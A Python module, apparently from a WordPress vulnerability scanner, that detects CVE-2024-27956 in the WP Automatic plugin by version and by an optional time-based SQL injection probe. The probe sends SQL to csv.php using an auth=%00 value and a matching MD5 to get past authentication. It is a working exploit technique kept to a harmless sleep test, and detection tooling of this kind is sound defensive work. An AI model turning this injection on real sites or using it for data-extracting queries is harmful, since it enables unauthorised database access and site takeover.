from __future__ import annotations

import hashlib
import time
import urllib.parse
from typing import Any

from ...core.http import HttpClient, normalize_url
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2024-27956"
NAME = "WP Automatic unauthenticated SQL injection"
RULE = "WP Automatic through 3.92.0; fixed in 3.92.1"
PLUGIN_SLUG = "wp-automatic"
TYPE = "SQL Injection"
CVSS = "9.9"
_CONTROL = "SELECT IF(1=2,sleep(4),sleep(0));"
_PROOF = "SELECT IF(1=1,sleep(4),sleep(0));"


def classify_version(version: str | None) -> str:
    value = parse_version_safe(version)
    if value is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if value <= parse_version_required("3.92.0") else "PATCHED"


def _timed_query(client: HttpClient, url: str, query: str, timeout: int) -> dict[str, Any]:
    form = urllib.parse.urlencode(
        {
            "q": query,
            "auth": "\x00",
            "integ": hashlib.md5(query.encode("utf-8")).hexdigest(),
        }
    )
    started = time.monotonic()
    response = client.request(
        url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form.encode(),
        timeout=timeout,
        follow_redirects=False,
    )
    elapsed = time.monotonic() - started
    body = str(response.get("body") or "")
    return {
        "elapsed": round(elapsed, 2),
        "status": response.get("status"),
        "csv": "DATE,ACTION,DATA,KEYWORD" in body,
    }


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict[str, Any]:
    base = normalize_url(target_url)
    url = f"{base}/wp-content/plugins/wp-automatic/inc/csv.php"
    probe_timeout = max(timeout, 12)
    client = HttpClient(timeout=probe_timeout, proxy=proxy)
    control = _timed_query(client, url, _CONTROL, probe_timeout)
    proof = _timed_query(client, url, _PROOF, probe_timeout)
    confirmed = (
        proof["csv"]
        and proof["status"] == 200
        and proof["elapsed"] >= 3.5
        and control["elapsed"] <= 2.0
        and proof["elapsed"] - control["elapsed"] >= 2.5
    )
    return {
        "confirmed": confirmed,
        "control": control,
        "proof": proof,
        "proof_url": url,
    }


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    del cms_version, kwargs
    finding = passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component="WordPress plugin WP Automatic",
        affected_rule=RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation=(
            "Upgrade WP Automatic to 3.92.1 or newer, remove the unused csv.php endpoint, and "
            "review the database for unexpected administrator accounts."
        ),
        exploit_available=True,
    )
    if not run_exploit_check or finding.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return finding
    if exploit_mode != "safe":
        finding.detail += " This module supports only the safe constant-sleep SQL differential."
        return finding

    proof = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    finding.exploit_ran = True
    finding.evidence = {**(finding.evidence or {}), **proof}
    if proof["confirmed"]:
        finding.status = "VULNERABLE"
        finding.confidence = "CONFIRMED"
        finding.proof_url = proof["proof_url"]
        finding.detail = (
            "The csv.php endpoint accepted an unauthenticated POST with auth=%00 and a matching "
            "query MD5. A constant FALSE-branch query returned in "
            f"{proof['control']['elapsed']}s while the TRUE-branch sleep(4) query returned in "
            f"{proof['proof']['elapsed']}s, proving attacker SQL reached the database. No rows "
            f"or schema data were requested. (CVSS {CVSS})"
        )
    else:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = (
            "The constant-sleep SQL differential was not observed "
            f"(control={proof['control']['elapsed']}s, proof={proof['proof']['elapsed']}s, "
            f"csv={proof['proof']['csv']})."
        )
    return finding


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": "WordPress plugin WP Automatic",
        "affected_rule": RULE,
        "affected_versions": ["<=3.92.0"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "vulnerability_type": TYPE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-13",
        "updated": "2026-11-13",
        "required_detectors": ["wordpress"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-27956",
            "https://patchstack.com/database/vulnerability/wp-automatic/wordpress-automatic-plugin-3-92-0-unauthenticated-arbitrary-sql-execution-vulnerability",
        ],
    }
